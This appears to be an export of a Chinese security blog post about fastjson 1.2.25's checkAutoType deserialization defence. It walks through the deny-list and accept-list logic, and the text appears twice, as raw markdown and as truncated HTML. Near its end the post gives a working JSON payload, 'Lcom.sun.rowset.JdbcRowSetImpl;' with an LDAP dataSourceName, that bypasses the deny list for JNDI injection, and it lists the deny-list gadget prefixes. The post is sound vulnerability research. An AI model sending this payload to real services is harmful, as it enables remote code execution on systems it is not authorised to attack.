defaultClassLoader);\n```\n\n程序最终将字符串反序列化为clazz所表示的类对象。我们着重分析下TypeUtils.loadClass是如何实现的\n\nTypeUtils.loadClass方法位于com/alibaba/fastjson/util/TypeUtils.java中\n\n```java\npublic static Class<?> loadClass(String className, ClassLoader classLoader) {\n    if (className == null || className.length() == 0) {\n        return null;\n    }\n\n    Class<?> clazz = mappings.get(className);\n\n    if (clazz != null) {\n        return clazz;\n    }\n\n    if (className.charAt(0) == '[') {\n        Class<?> componentType = loadClass(className.substring(1), classLoader);\n        return Array.newInstance(componentType, 0).getClass();\n    }\n\n    if (className.startsWith(\"L\") && className.endsWith(\";\")) {\n        String newClassName = className.substring(1, className.length() - 1);\n        return loadClass(newClassName, classLoader);\n    }\n```\n\n问题就出在下图代码上：\n\n![9d5e68c2ef26557badccfca670540cc9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152330-8e91dc2e-dba3-1.png)\n\n当传入的className变量以”L”开头，并以”;”结尾，进入该if分支。在这个if分支中，程序将会把开头的”L”与结尾的”;”去掉，并递归调用loadClass加载这个类。因此可以下图这样构造来进行绕过\n\n![54ce372006a50b8930efc41634dcb40b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152340-94667736-dba3-1.png)\n\n```java\npublic static void main(String[] args) {\n    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n    String jsonstr = \"{\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\" +\n            \" \\\"autoCommit\\\":true}\";\n    Object obj = JSON.parseObject(jsonstr);\n    System.out.println(obj);\n}\n```\n\nloadClass会将”L”与”;”去除后组成newClassName并返回\n\n![5efedf30915eee73c1f30a0f2e229e89.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152351-9abad58c-dba3-1.png)\n\n这一操作在匹配黑白名单之后，Lcom.sun.rowset.JdbcRowSetImpl;恰好可以绕过黑名单中的限制。后续checkAutoType检测机制进行了一系列的安全加固，大体上都是黑名单防逆向分析、扩展黑名单列表等，但checkAutoType检测机制没有太大的改变。受篇幅影响，这里就不再详细分析了。","source":"_posts/FastJson-checkAutoType.md","raw":"---\ntitle: FastJson checkAutoType安全机制研究\ndate: 2020-08-19 17:15:32\ntags: web漏洞分析\ncategories: 技术\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/d875a0425cab5a73c296a118f6d220e.jpg\n---\n\n在FastJson1.2.25以及之后的版本中，fastjson为了防止autoType这一机制带来的安全隐患，增加了一层名为checkAutoType的检测机制。在之后的版本中，随着checkAutoType安全机制被不断绕过，fastjson也进行了一系列例如黑名单防逆向分析、扩展黑名单列表等加固。但是checkAutoType的原理未曾有过大的变化，因此本文将以fastjson 1.2.25版本为例，介绍一下checkAutoType安全机制的原理。\n\n在调试分析fastjson的checkAutoType安全机制之前，发现网上很多fastjson漏洞的分析文章中曾经提到过一个名为autoTypeSupport的开关，且在1.2.25以及之后的版本中默认关闭。在动手调试之前，我曾一度以为autoTypeSupport开关关闭与否直接决定了fastjson是完全摒弃或是使用autotype功能的。但是实际调试中发现，这个开关仅仅是checkAutoType安全机制中的一个选项，这个开关的关闭与否，并不直接作用于fastjson是否使用autoType机制，下文案例中可以看出这个问题。\n\nfastjson在1.2.25以及之后的版本中引入的checkAutoType安全机制，位于com/alibaba/fastjson/parser/ParserConfig.java文件。但并不是所有情况下fastjson都会加载这个机制进行安全监测，让我们下面来看看究竟什么情况下这个安全机制会被触发。\n\n通过调试fastjson 1.2.25代码发现，如果想触发checkAutoType安全机制，需要执行到com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java中下图红框处位置\n\n![0e5919b9c8a6af8d6128a67c5eeed81b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151506-61d5fbe4-dba2-1.png)\n\n在分析触发checkAutoType安全机制的情况之前，首先来看下什么情况下不会触发checkAutoType安全机制\n\n不使用checkAutoType安全机制的情况\n---------------------------------\n\nfastjson将字符串转换为Java对象时，并不是都采用checkAutoType机制进行校验，以下两种情况均为使用checkAutoType机制\n\n- json字符串中未使用@type字段\n\n```java\n    public static void main(String[] args){\n        String jsonstr = \"{\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);\n    }\n```\n\n待处理字符串中并不包含@type字段。在将这个普通的json字符串转换为java对象方法过程中并不执行到上文JavaBeanDeserializer.java中userType = config.checkAutoType(typeName, expectClass);位置\n\n- Class\\<T\\> clazz与@type相同\n\n```java\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);\n    }\n}\n```\n\n待处理的字符串@type指定的类与parseObject(String text, Class\\<T\\> clazz)中Class\\<T\\> clazz)参数指定的类相同，都是AutoTypeTest.Test1。在这种情况下，程序执行到下图红框处分支中\n\n![c260c13f64e851f6bd19932a6f08760f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151546-7a078f20-dba2-1.png)\n\n上图中typeName变量值由@type值传递而来；beanInfo.typeName变量值由parseObject(String text, Class\\<T\\> clazz)中Class\\<T\\> clazz所指定。在Class\\<T\\> clazz值与@type值相同的情况下，程序进入上图红框中的if分支。而在这个分支中，程序不是被break就是被continue，而checkAutoType安全机制加载位置又处在该处if分支后面（上图552行），因此程序无论如何也不会执行到上图552行的checkAutoType安全机制中。\n\n由上文两个例子可见，在1.2.25以及之后的版本中，并不是所有的情况都需要经过checkAutoType这一关卡的。\n\n我们接下来看看如何触发checkAutoType安全机制，以及checkAutoType安全机制的原理。\n\n使用checkAutoType安全机制的情况\n-------------------------------\n\n通过分析可以发现，checkAutoType安全机制中也是针对不同情况不同处理的：checkAutoType安全机制处理流程受autoTypeSupport、parseObject参数等因素控制，这些因素共同影响checkAutoType安全机制是如何过滤以及处理传入的等待反序列化的json字符串\n\n总得来说，有如下几个元素共同作用影响checkAutoType选择哪种方式处理输入\n\n- autoTypeSupport开关值（True/False）\n- 使用parseObject(String text, Class\\<T\\> clazz)或是parseObject(String text)（这里Class\\<T\\> clazz参数为应与@type字段不一样的值，否则不会触发checkAutoType）\n\n根据这两种条件，我们可以列出如下四种情况的表格\n\n|        | autoTypeSupport值 | parseObject(String text, Class\\<T\\> clazz)/ parseObject(String text) |\n| ------ | ----------------- | ------------------------------------------------------------ |\n| 情况一 | False             | parseObject(String text)                                     |\n| 情况二 | False             | parseObject(String text, Class\\<T\\> clazz)                   |\n| 情况三 | True              | parseObject(String text)                                     |\n| 情况四 | True              | parseObject(String text, Class\\<T\\> clazz)                   |\n\n接下来我们对上述四种情况逐一进行分析\n\n### autoTypeSupport值为False、使用parseObject(String text) \n\n```java\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n接下来我们来看一下这种情况下checkAutoType安全机制是如何进行处理的\n\ncheckAutoType位于com/alibaba/fastjson/parser/ParserConfig.java中\n\n```java\n    public Class<?> checkAutoType(String typeName, Class<?> expectClass) {\n        if (typeName == null) {\n            return null;\n        }\n\n        final String className = typeName.replace('$', '.');\n\n        if (autoTypeSupport || expectClass != null) {\n            ⋮\n        }\n\n        Class<?> clazz = TypeUtils.getClassFromMapping(typeName);\n        if (clazz == null) {\n            ⋮\n        }\n\n        if (clazz != null) {\n            ⋮\n        }\n\n        if (!autoTypeSupport) {\n            for (int i = 0; i < denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n            for (int i = 0; i < acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n\n                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {\n                        throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName());\n                    }\n                    return clazz;\n                }\n            }\n        }\n```\n\n由于autoTypeSupport为False，程序进入if (!autoTypeSupport)分支中\n\n```java\n        if (!autoTypeSupport) {\n            for (int i = 0; i < denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n            for (int i = 0; i < acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n\n                    if (expectClass != null && expectClass.isAssignableFrom(clazz)) {\n                        throw new JSONException(\"type not match. \" + typeName + \" -> \" + expectClass.getName());\n                    }\n                    return clazz;\n                }\n            }\n        }\n```\n\n程序首先遍历denyList这一黑名单，并判断className与黑名单是否匹配\n\n![934359dd24e91c0eae2b706a4721c00d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151624-904c2f3e-dba2-1.png)\n\n这里需要说明一下：className变量是由typeName简单变换而来，而typeName即为@type字段值。详见下图代码\n\n![c2e0aee6246db707820606da77be9959.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151634-96d0d38c-dba2-1.png)\n\n接下来看下黑名单中的元素\n\n![fdc610a0d2a6392ae7f762de681b70e8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151645-9d460688-dba2-1.png)\n\n```java\ndenyList =\n\"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework\"\n```\n\n如果className命中黑名单，程序抛出\"autoType is not support.\"异常并结束\n\n在黑名单过滤完成后，程序还会将className与白名单匹配一下，下图中红框里的for循环即为白名单匹配过程\n\n![0a39d8ffe2cf014fd9911637f87f606e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151704-a8b4b780-dba2-1.png)\n\n程序将className与acceptList白名单进行匹配，通过动态调试查看以下默认白名单中的值\n\n![728bed570e73423cc97341d28103790d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151715-aee0e7fa-dba2-1.png)\n\n从动态调试的结果可见，acceptList默认情况下是一个空列表。\n\n开发者可以通过ParserConfig.getGlobalInstance().addAccept()自行向acceptList白名单中增加元素。如下代码向白名单中增加了一个AutoTypeTest.Test1类\n\n```java\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().addAccept(\"AutoTypeTest.Test1\");\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj);\n    }\n}\n```\n\n在白名单匹配环节，如果className指定的类与白名单中的项相匹成功，程序将该类的类对象赋值与clazz变量并返回\n\n![65eefbeb121ed88086f2a3b56d0f52af.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151736-bbb9bede-dba2-1.png)\n\n程序接下来将传入的json字符串反序列为该类对象\n\n在程序执行完黑名单与白名单校验后，既没有匹配到黑名单，也没有匹配到白名单的话，程序最终会执行到下图分支\n\n![a5f4f7b4da2b416081ae013ea2ea93c9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151754-c5f10970-dba2-1.png)\n\n此时程序将抛出异常并结束\n\n![92d6e52681cbab4b63d15ef0f1d39667.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151804-cc209b58-dba2-1.png)\n\n由于在1.2.25以及之后的版本中，autoTypeSupport值默认False。所以1.2.25以及之后的版本中假使攻击者构造的payload中的恶意类绕过了黑名单，但如果payload中的类不在白名单上，也是不能成功利用的。值得注意的是，白名单默认情况是空的。在此场景下payload想要执行成功，只有一种可能性：\n\n- @type字段值在不在黑名单中且在白名单中\n\n### autoTypeSupport值为False、使用parseObject(String text, Class\\<T\\> clazz) \n\n```java\n    public static void main(String[] args) {\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test.class);\n        System.out.println(obj);\n    }\n}\n```\n\n注意上图，这里parseObject中的Class\\<T\\> clazz参数是AutoTypeTest.Test.class，而@type中的是AutoTypeTest.Test1，二者不是一个类。如果是一个类，根据上文checkAutoType触发条件分析，根本不会触发checkAutoType\n\n在这种情况下，我们再来看看checkAutoType会如何处理我们的数据\n\n```java\n    public Class<?> checkAutoType(String typeName, Class<?> expectClass) {\n        if (typeName == null) {\n            return null;\n        }\n\n        final String className = typeName.replace('$', '.');\n\n        if (autoTypeSupport || expectClass != null) {\n            for (int i = 0; i < acceptList.length; ++i) {\n                String accept = acceptList[i];\n                if (className.startsWith(accept)) {\n                    return TypeUtils.loadClass(typeName, defaultClassLoader);\n                }\n            }\n\n            for (int i = 0; i < denyList.length; ++i) {\n                String deny = denyList[i];\n                if (className.startsWith(deny)) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n        }\n```\n\n此时autoTypeSupport为true，expectClass不为空，程序会首先进入if (autoTypeSupport || expectClass != null)分支\n\n![ecafe6fede023596c9569bc166e154ae.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151827-d9eab0a2-dba2-1.png)\n\n值得注意的是，这个分支中是先匹配白名单，后匹配黑名单，如果@type字段指定的类在白名单中，则直接返回，不需要再经过黑名单过滤了。这一点很有意思，如果开发者因为开发失误，将存在利用的类加到了白名单里，攻击者是可以直接利用的\n\n回归正文，由于上图这里我们没有向白名单中增加AutoTypeTest.Test.class类，程序会接下来检查传入的类是否在黑名单中\n\n![93d672dc9d0fcd22ed5472e5ad1e7dd8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151838-e0ad1222-dba2-1.png)\n\n如果匹配到黑名单，则直接抛出错误\n\n如果这里既没有匹配到白名单直接返回，也没有匹配到黑名单抛出错误终止，程序则继续向下执行\n\n![e88c7abb2f44009cab7f6ed16955765e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151852-e8b00d9e-dba2-1.png)\n\n继续执行到的这个分支与情况一中的完全一致，又匹配了一遍黑名单与白名单。显而易见，这里既不会匹配到白名单，也不会匹配到黑名单\n\n最后程序执行到下图这里\n\n![0207749c04146ac393ecfe5159bb1d5b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811151904-efb62f74-dba2-1.png)\n\n由于我们使用的是parseObject(String text, Class\\<T\\> clazz)这种方式，上图代码中872行处的expectClass即为Class\\<T\\> clazz传入的AutoTypeTest.Test.class类，而clazz变量为@type字段指定的AutoTypeTest.Test1.class类.程序通过\n\n```java\nexpectClass.isAssignableFrom(clazz)\n```\n\n判断Class\\<T\\> clazz传入的expectClass对象所表示的类是否与@type字段指定的clazz变量参数表示的类相同，或者是其超类或父接口。本例中AutoTypeTest.Test.class类与AutoTypeTest.Test1.class类所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常\n\n```java\nException in thread \"main\" com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\> AutoTypeTest.Test\n```\n\n如果二者相同或者是超类、父类关系，程序将@type字段指定的类对象返回，并随后将传入字符串反序列化为该类对象\n\n- 此场景的安全隐患\n\n通过上文的分析，在此场景下程序会先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则程序是会跳过黑名单校验的，例如下图\n\n![e1fc601a50996f55f7a347bec030c7cc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152135-4a20674a-dba3-1.png)\n\n即使com.sun.rowset.JdbcRowSetImpl在Fastjson默认黑名单中，但在开发的时候，由于开发安全意识不强或开发疏忽等原因，将com.sun.rowset.JdbcRowSetImpl加入了白名单，此时是可以绕过黑名单直接执行利用的。在此场景下，payload想执行成功，有两种可能性：\n\n- 没有命中黑名单且Class\\<T\\> clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。\n\n- @type字段值在白名单中\n\n### autoTypeSupport值为True、使用parseObject(String text)\n\n```java\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr);\n        System.out.println(obj)\n    }\n```\n\n在此场景中，程序首先进入了与上一场景相同的分支，与上一场景不同的是，这里是由于autoTypeSupport为true而进入此分支，而非上一场景满足expectClass != null这一条件\n\n![b6c844dff52bc46218e02c1dbd3767d9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152202-59fb1002-dba3-1.png)\n\n与上一场景一致，程序先匹配白名单、后匹配黑名单。如果@type字段指定的类在白名单中，则直接返回，不再进行黑名单校验。在白名单未匹配成功后，使用黑名单进行匹配，若匹配到黑名单，直接抛出异常。如果黑白名单都未匹配成功，程序继续向下执行\n\n![0458fe27ed39a0e5e2dc5c69964b09af.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152212-6019ceb0-dba3-1.png)\n\n程序将@type字段指定的类返回\n\n这种情况下要是payload想成功利用有两种办法：\n\n- @type字段值只需要不在黑名单中即可成功利用\n\n- @type字段值在黑名单中，但是开发的时候在白名单中加入了这个类，payload依然可以成功利用\n\n### 四、autoTypeSupport值为True、使用parseObject(String text, Class\\<T\\> clazz)\n\n    public static void main(String[] args) {\n        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n        String jsonstr = \"{\\\"@type\\\":\\\"AutoTypeTest.Test1\\\",\\\"s1\\\":\\\"1\\\"}\";\n        Object obj = JSON.parseObject(jsonstr,AutoTypeTest.Test.class);\n        System.out.println(obj)\n    }\n与上文第二、三场景相同，程序首先进入了这个分支\n\n![0bf84f2d75a81d8e7fcf8958a65a3c34.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152236-6e80c67a-dba3-1.png)\n\n此场景进入该分支的原因是autoTypeSupport与expectClass这两个条件都满足。关于这个分支的执行流程这里不再复述了\n\n在没有匹配到黑白名单后，程序执行到了下图这里\n\n![7832ca5693b89b2f1fb912c9df9cfe76.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152247-750ab5f0-dba3-1.png)\n\n由于这里clazz与expectClass所表示的类与接口不同，也不是超类或父类关系。因此程序抛出异常\n\n```java\nException in thread \"main\" com.alibaba.fastjson.JSONException: type not match.AutoTypeTest.Test1 -\\> AutoTypeTest.Test\n```\n\n在这种情况下，payload想执行成功，有两种可能性：\n\n- 没有命中黑名单且Class\\<T\\>\n  clazz表示的类或接口是否与指定的@type字段值表示的类或接口相同，或者是其超类或父接口。\n\n- @type字段值在白名单中\n\n早期checkAutoType安全机制缺陷\n-----------------------------\n\n在fastjson 1.2.25版本引入的checkAutoType以及后续的几个版本中存在着一定的缺陷\n\n如上文所分析，程序通常先经过黑名单与白名单的校验后，将满足条件的类对象通过如下代码赋值给clazz\n\n```java\nclazz = TypeUtils.loadClass(typeName, defaultClassLoader);\n```\n\n程序最终将字符串反序列化为clazz所表示的类对象。我们着重分析下TypeUtils.loadClass是如何实现的\n\nTypeUtils.loadClass方法位于com/alibaba/fastjson/util/TypeUtils.java中\n\n```java\npublic static Class<?> loadClass(String className, ClassLoader classLoader) {\n    if (className == null || className.length() == 0) {\n        return null;\n    }\n\n    Class<?> clazz = mappings.get(className);\n\n    if (clazz != null) {\n        return clazz;\n    }\n\n    if (className.charAt(0) == '[') {\n        Class<?> componentType = loadClass(className.substring(1), classLoader);\n        return Array.newInstance(componentType, 0).getClass();\n    }\n\n    if (className.startsWith(\"L\") && className.endsWith(\";\")) {\n        String newClassName = className.substring(1, className.length() - 1);\n        return loadClass(newClassName, classLoader);\n    }\n```\n\n问题就出在下图代码上：\n\n![9d5e68c2ef26557badccfca670540cc9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152330-8e91dc2e-dba3-1.png)\n\n当传入的className变量以”L”开头，并以”;”结尾，进入该if分支。在这个if分支中，程序将会把开头的”L”与结尾的”;”去掉，并递归调用loadClass加载这个类。因此可以下图这样构造来进行绕过\n\n![54ce372006a50b8930efc41634dcb40b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152340-94667736-dba3-1.png)\n\n```java\npublic static void main(String[] args) {\n    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);\n    String jsonstr = \"{\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://localhost:1389/ExecTest\\\",\" +\n            \" \\\"autoCommit\\\":true}\";\n    Object obj = JSON.parseObject(jsonstr);\n    System.out.println(obj);\n}\n```\n\nloadClass会将”L”与”;”去除后组成newClassName并返回\n\n![5efedf30915eee73c1f30a0f2e229e89.png](https://xzfile.aliyuncs.com/media/upload/picture/20200811152351-9abad58c-dba3-1.png)\n\n这一操作在匹配黑白名单之后，Lcom.sun.rowset.JdbcRowSetImpl;恰好可以绕过黑名单中的限制。后续checkAutoType检测机制进行了一系列的安全加固，大体上都是黑名单防逆向分析、扩展黑名单列表等，但checkAutoType检测机制没有太大的改变。受篇幅影响，这里就不再详细分析了。","slug":"FastJson-checkAutoType","published":1,"updated":"2020-10-27T09:25:29.380Z","_id":"ckgrozuaj006cwsa9hu383w8w","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在FastJson1.2.25以及之后的版本中，fastjson为了防止autoType这一机制带来的安全隐患，增加了一层名为checkAutoType的检测机制。在之后的版本中，随着checkAutoType安全机制被不断绕过，fastjson也进行了一系列例如黑名单防逆向分析、扩展黑名单列表等加固。但是checkAutoType的原理未曾有过大的变化，因此本文将以fastjson 1.2.25版本为例，介绍一下checkAutoType安全机制的原理。</p>\n<p>在调试分析fastjson的checkAutoType安全机制之前，发现网上很多fastjson漏洞的分析文章中曾经提到过一个名为autoTypeSupport的开关，且在1.2.25以及之后的版本中默认关闭。在动手调试之前，我曾一度以为autoTypeSupport开关关闭与否直接决定了fastjson是完全摒弃或是使用autotype功能的。但是实际调试中发现，这个开关仅仅是checkAutoType安全机制中的一个选项，这个开关的关闭与否，并不直接作用于fastjson是否使用autoType机制，下文案例中可以看出这个问题。</p>\n<p>fastjson在1.2.25以及之后的版本中引入的checkAutoType安全机制，位于com/alibaba/fastjson/parser/ParserConfig.java文件。但并不是所有情况下fastjson都会加载这个机制进行安全监测，让我们下面来看看究竟什么情况下这个安全机制会被触发。</p>\n<p>通过调试fastjson 1.2.25代码发现，如果想触发checkAutoType安全机制，需要执行到com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java中下图红框处位置</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151506-61d5fbe4-dba2-1.png\" alt=\"0e5919b9c8a6af8d6128a67c5eeed81b.png\"></p>\n<p>在分析触发checkAutoType安全机制的情况之前，首先来看下什么情况下不会触发checkAutoType安全机制</p>\n<h2 id=\"不使用checkAutoType安全机制的情况\"><a href=\"#不使用checkAutoType安全机制的情况\" class=\"headerlink\" title=\"不使用checkAutoType安全机制的情况\"></a>不使用checkAutoType安全机制的情况</h2><p>fastjson将字符串转换为Java对象时，并不是都采用checkAutoType机制进行校验，以下两种情况均为使用checkAutoType机制</p>\n<ul>\n<li>json字符串中未使用@type字段</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">    String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">    Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>待处理字符串中并不包含@type字段。在将这个普通的json字符串转换为java对象方法过程中并不执行到上文JavaBeanDeserializer.java中userType = config.checkAutoType(typeName, expectClass);位置</p>\n<ul>\n<li>Class&lt;T&gt; clazz与@type相同</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test1\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr, AutoTypeTest.Test1.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>待处理的字符串@type指定的类与parseObject(String text, Class&lt;T&gt; clazz)中Class&lt;T&gt; clazz)参数指定的类相同，都是AutoTypeTest.Test1。在这种情况下，程序执行到下图红框处分支中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200811151546-7a078f20-dba2-1.png\" alt=\"c260c13f64e851f6bd19932a6f08760f.png\"></p>\n<p>上图中typeName变量值由@type值传递而来；beanInfo.typeName变量值由parseObject(String text, Class&lt;T&gt; clazz)中Class&lt;T&gt; clazz所指定。在Class&lt;T&gt; clazz值与@type值相同的情况下，程序进入上图红框中的if分支。而在这个分支中，程序不是被break就是被continue，而checkAutoType安全机制加载位置又处在该处if分支后面（上图552行），因此程序无论如何也不会执行到上图552行的checkAutoType安全机制中。</p>\n<p>由上文两个例子可见，在1.2.25以及之后的版本中，并不是所有的情况都需要经过checkAutoType这一关卡的。</p>\n<p>我们接下来看看如何触发checkAutoType安全机制，以及checkAutoType安全机制的原理。</p>\n<h2 id=\"使用checkAutoType安全机制的情况\"><a href=\"#使用checkAutoType安全机制的情况\" class=\"headerlink\" title=\"使用checkAutoType安全机制的情况\"></a>使用checkAutoType安全机制的情况</h2><p>通过分析可以发现，checkAutoType安全机制中也是针对不同情况不同处理的：checkAutoType安全机制处理流程受autoTypeSupport、parseObject参数等因素控制，这些因素共同影响checkAutoType安全机制是如何过滤以及处理传入的等待反序列化的json字符串</p>\n<p>总得来说，有如下几个元素共同作用影响checkAutoType选择哪种方式处理输入</p>\n<ul>\n<li>autoTypeSupport开关值（True/False）</li>\n<li>使用parseObject(String text, Class&lt;T&gt; clazz)或是parseObject(String text)（这里Class&lt;T&gt; clazz参数为应与@type字段不一样的值，否则不会触发checkAutoType）</li>\n</ul>\n<p>根据这两种条件，我们可以列出如下四种情况的表格</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>autoTypeSupport值</th>\n<th>parseObject(String text, Class&lt;T&gt; clazz)/ parseObject(String text)</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>情况一</td>\n<td>False</td>\n<td>parseObject(String text)</td>\n</tr>\n<tr>\n<td>情况二</td>\n<td>False</td>\n<td>parseObject(String text, Class&lt;T&gt; clazz)</td>\n</tr>\n<tr>\n<td>情况三</td>\n<td>True</td>\n<td>parseObject(String text)</td>\n</tr>\n<tr>\n<td>情况四</td>\n<td>True</td>\n<td>parseObject(String text, Class&lt;T&gt; clazz)</td>\n</tr>\n</tbody></table>\n<p>接下来我们对上述四种情况逐一进行分析</p>\n<h3 id=\"autoTypeSupport值为False、使用parseObject-String-text\"><a href=\"#autoTypeSupport值为False、使用parseObject-String-text\" class=\"headerlink\" title=\"autoTypeSupport值为False、使用parseObject(String text)\"></a>autoTypeSupport值为False、使用parseObject(String text)</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String jsonstr = <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;AutoTypeTest.Test\\&quot;,\\&quot;s1\\&quot;:\\&quot;1\\&quot;&#125;&quot;</span>;</span><br><span class=\"line\">        Object obj = JSON.parseObject(jsonstr);</span><br><span class=\"line\">        System.out.println(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>接下来我们来看一下这种情况下checkAutoType安全机制是如何进行处理的</p>\n<p>checkAutoType位于com/alibaba/fastjson/parser/ParserConfig.java中</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span 